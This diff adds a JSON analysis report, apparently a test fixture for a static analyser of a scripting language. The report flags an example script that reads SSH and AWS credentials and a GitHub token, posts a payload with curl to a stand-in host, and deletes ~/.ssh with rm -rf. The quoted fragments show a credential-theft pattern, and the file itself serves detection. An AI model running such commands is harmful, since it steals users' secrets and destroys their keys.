@@ -1,0 +1,116 @@
+{
+  "commands": [
+    {
+      "args": [
+        "--silent",
+        "--data",
+        null,
+        "https://backups-cdn.example.net/collect"
+      ],
+      "checked": false,
+      "in_pipe": false,
+      "line": 21,
+      "program": "curl",
+      "source": "try to run \"curl\" with \"--silent\", \"--data\", payload, \\",
+      "timeout": false
+    },
+    {
+      "args": [
+        "-rf",
+        null
+      ],
+      "checked": true,
+      "in_pipe": false,
+      "line": 25,
+      "program": "rm",
+      "source": "run \"rm\" with \"-rf\", home & \"/.ssh\"",
+      "timeout": false
+    }
+  ],
+  "deletes": [],
+  "environment": [
+    {
+      "line": 10,
+      "name": "HOME"
+    },
+    {
+      "line": 15,
+      "name": "GITHUB_TOKEN"
+    }
+  ],
+  "exits": [],
+  "findings": [
+    {
+      "detail": "This path points at a file that usually holds keys or tokens.",
+      "line": 13,
+      "severity": "danger",
+      "source": "put file (home & \"/.ssh/id_rsa\") into private key",
+      "title": "Reads credentials"
+    },
+    {
+      "detail": "This path points at a file that usually holds keys or tokens.",
+      "line": 14,
+      "severity": "danger",
+      "source": "put file (home & \"/.aws/credentials\") into aws keys",
+      "title": "Reads credentials"
+    },
+    {
+      "detail": "This environment variable normally holds a token or key.",
+      "line": 15,
+      "severity": "caution",
+      "source": "put the environment variable \"GITHUB_TOKEN\" into git token",
+      "title": "Reads a secret from the environment (GITHUB_TOKEN)"
+    },
+    {
+      "detail": "This script reads credentials and also sends data over the network. On a script you did not write yourself, that is the pattern of data theft.",
+      "line": 21,
+      "severity": "danger",
+      "source": "try to run \"curl\" with \"--silent\", \"--data\", payload, \\",
+      "title": "Secrets read, then the network is contacted"
+    },
+    {
+      "detail": "A network command with no deadline can hang the script indefinitely.",
+      "line": 21,
+      "severity": "caution",
+      "source": "try to run \"curl\" with \"--silent\", \"--data\", payload, \\",
+      "title": "No timeout on curl"
+    },
+    {
+      "detail": "This was written as 'try to run' but the result is never examined, so a failure passes silently.",
+      "line": 21,
+      "severity": "caution",
+      "source": "try to run \"curl\" with \"--silent\", \"--data\", payload, \\",
+      "title": "Failure ignored (curl)"
+    },
+    {
+      "detail": "Data can leave this machine, and the result depends on a system you do not control.",
+      "line": 21,
+      "severity": "note",
+      "source": "try to run \"curl\" with \"--silent\", \"--data\", payload, \\",
+      "title": "Reaches the network via curl (https://backups-cdn.example.net/collect)"
+    },
+    {
+      "detail": "rm -rf removes a whole tree without confirming and without reporting what it removed.",
+      "line": 25,
+      "severity": "danger",
+      "source": "run \"rm\" with \"-rf\", home & \"/.ssh\"",
+      "title": "Recursive forced delete"
+    }
+  ],
+  "reads": [
+    {
+      "line": 13,
+      "path": null,
+      "source": "put file (home & \"/.ssh/id_rsa\") into private key"
+    },
+    {
+      "line": 14,
+      "path": null,
+      "source": "put file (home & \"/.aws/credentials\") into aws keys"
+    }
+  ],
+  "script": "examples/exfiltrate.frost",
+  "summary": "This script runs curl, rm, reaches the internet using curl, reads 2 files (runtime), and reads 2 environment variables.",
+  "verdict": "dangerous",
+  "writes": []
+}
